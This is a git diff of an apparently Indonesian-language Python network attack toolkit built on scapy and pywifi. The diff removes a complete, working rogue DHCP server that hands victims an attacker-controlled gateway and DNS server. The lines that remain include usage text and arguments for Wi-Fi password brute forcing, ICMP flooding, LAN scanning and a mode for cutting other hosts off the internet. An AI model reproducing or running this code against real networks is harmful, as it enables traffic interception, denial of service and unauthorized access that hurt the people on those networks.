@@ -1,5 +1,3 @@
-#!/home/kali/Documents/projo/src/bin/python
-
 import pywifi
 from pywifi import PyWiFi
 from pywifi import const
@@ -8,74 +6,6 @@ from scapy.all import *
 from mac_vendor_lookup import MacLookup, VendorNotFoundError
 import time, argparse, os, pyfiglet, socket, struct, random
 from termcolor import colored
-
-class RogueDHCP:
-    def __init__(self, target_ip, gateway, dns_s, sub, lt, iface, splitted):
-        self.ATTACKER_IP = target_ip
-        self.GATEWAY_IP = gateway
-        self.DNS_IP = dns_s
-        self.SUBNET_MASK = sub
-        self.LEASE_TIME = lt
-        self.iface = iface
-        self.OFFER_POOL = [splitted + str(i) for i in range(200, 250)]
-        self.assigned_ips = {}
-
-    def mac2str(self, mac):
-        return bytes.fromhex(mac.replace(':', ''))
-
-    def handle_dhcp(self, pkt):
-        if DHCP not in pkt:
-            return
-        
-        attacker_mac = get_if_hwaddr(self.iface)
-        msg_type = pkt[DHCP].options[0][1]
-        mac = pkt[Ether].src
-
-        if msg_type == 1:  # DHCP Discover
-            offered_ip = random.choice(self.OFFER_POOL)
-            self.assigned_ips[mac] = offered_ip
-
-            print(f"[+] Discover dari {mac} → Offer {offered_ip}")
-
-            ether = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
-            ip = IP(src=self.ATTACKER_IP, dst="255.255.255.255")
-            udp = UDP(sport=67, dport=68)
-            bootp = BOOTP(op=2, yiaddr=offered_ip, siaddr=self.ATTACKER_IP, chaddr=self.mac2str(mac))
-            dhcp = DHCP(options=[
-                ('message-type', 'offer'),
-                ('server_id', self.ATTACKER_IP),
-                ('lease_time', int(self.LEASE_TIME)),
-                ('subnet_mask', self.SUBNET_MASK),
-                ('router', self.GATEWAY_IP),
-                ('name_server', self.DNS_IP),
-                'end'
-            ])
-            sendp(ether / ip / udp / bootp / dhcp, iface=self.iface, verbose=0)
-
-        elif msg_type == 3:  # DHCP Request
-            if mac in self.assigned_ips:
-                requested_ip = self.assigned_ips[mac]
-                print(f"[+] Request dari {mac} → ACK {requested_ip}")
-                
-                attacker_mac = get_if_hwaddr(self.iface)
-                ether = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff")
-                ip = IP(src=self.ATTACKER_IP, dst="255.255.255.255")
-                udp = UDP(sport=67, dport=68)
-                bootp = BOOTP(op=2, yiaddr=requested_ip, siaddr=self.ATTACKER_IP, chaddr=self.mac2str(mac))
-                dhcp = DHCP(options=[
-                    ('message-type', 'ack'),
-                    ('server_id', self.ATTACKER_IP),
-                    ('lease_time', int(self.LEASE_TIME)),
-                    ('subnet_mask', self.SUBNET_MASK),
-                    ('router', self.GATEWAY_IP),
-                    ('name_server', self.DNS_IP),
-                    'end'
-                ])
-                sendp(ether / ip / udp / bootp / dhcp, iface=self.iface, verbose=0)
-
-    def run(self):
-        print("Rogue DHCP Server berjalan...")
-        sniff(filter="udp and (port 67 or 68)", prn=self.handle_dhcp, store=0, iface=self.iface)
 
 def cracking(ssid, wordlist):
         print("Cracking Wifi Password ", ssid ,", Please Wait...")
@@ -307,33 +237,26 @@ def main():
  print()
  print("Untuk Bruteforce Wifi password:")
  print("Untuk scan Wi-Fi: python3 run.py --c scan_wifi_lists ")
- print("sudo bin/python run.py --c scan_wifi_lists")
  print("Untuk melakukan serangan brute force Wi-Fi : python3 run.py --c crack_wifi_password --s TARGET_WIFI --w WORDLIST.txt")
  print()
  print("Untuk ICMP Flood:")
  print("Untuk scan LAN IP: python3 run.py --c scan_ip --g GATEWAY_IP")
  print("Untuk melakukan serangan ICMP : python3 run.py --c icmp_attack --ip TARGET_IP --loop JUMLAH_PAKET_DIKIRIM")
  print()
- print("Untuk DHCP Rogue:")
- print("Untuk melakukan serangan: python3 run.py --c dhcp_rogue --ip ATTACKER_IP --g GATEWAY --d DNS_IP --sub SUBNET_MASK --lt LEASE_TIME(432000 --i INTERFACE")
- print()
  print("Untuk Stop Internet:")
  print("Untuk melakukan serangan: python3 run.py --c stop_internet --g GATEWAY --i INTERFACE --m MODE --p IP 3 DIGIT PERTAMA .255 ex(192.168.1.255)")
 
  parser = argparse.ArgumentParser()
  parser.add_argument('--loop', help='Gateway target untuk scan ip. cara penggunaan: --gateway 192.168.1.1/24')
- parser.add_argument('--ip', help='Gateway target untuk scan ip dan DHCP rogue untuk ip attacker. cara penggunaan: --ip 192.168.1.1/24')
- parser.add_argument('--g', help='Gateway target untuk scan ip dan DHCP rogue untuk gateway. cara penggunaan: --g 192.168.1.1/24')
- parser.add_argument('--d', help='DNS untuk DHCP rogue. cara penggunaan: --d 8.8.8.8')
- parser.add_argument('--sub', help='Subnet untuk DHCP rogue. cara penggunaan: --sub 255.255.255.255')
- parser.add_argument('--lt', help='Lease time untuk DHCP rogue. cara penggunaan: --lt 43200')
+ parser.add_argument('--ip', help='Gateway target untuk scan ip dan untuk ip attacker. cara penggunaan: --ip 192.168.1.1/24')
+ parser.add_argument('--g', help='Gateway target untuk scan ip dan untuk gateway. cara penggunaan: --g 192.168.1.1/24')
  parser.add_argument('--s', help='SSID target (hanya untuk mode brute)')
  parser.add_argument('--w', help='Path ke file wordlist (hanya untuk mode brute)')
  parser.add_argument('--i', help='Interface atau hardware penghubung')
  parser.add_argument('--m', help='pilih mode untuk stop internet')
  parser.add_argument('--p', help='pdst untuk stop internet')
  parser.add_argument('--l', help='untuk limit bandwidth')
- parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'dhcp_rogue', 'stop_internet'], help="Aksi yang ingin dilakukan")
+ parser.add_argument("--c", choices=['scan_wifi_lists', 'crack_wifi_password', 'scan_ip', 'icmp_attack', 'stop_internet'], help="Aksi yang ingin dilakukan")
  args = parser.parse_args()
 
  if args.c == 'scan_wifi_lists':
@@ -381,18 +304,5 @@ def main():
          print("\n[!] Stopping...")
          clear_tc()
          disable_forwarding()
- elif args.c == 'dhcp_rogue':
-  splitted = split_ip(args.ip)
-  print(splitted)
-
-  target_ip = args.ip
-  gateway = args.g
-  dns_s = args.d
-  sub = args.sub
-  lt = args.lt
-  iface = args.i
-  
-  dhcp_server = RogueDHCP(target_ip, gateway, dns_s, sub, lt, iface, splitted)
-  dhcp_server.run()
-  
+         
 main()
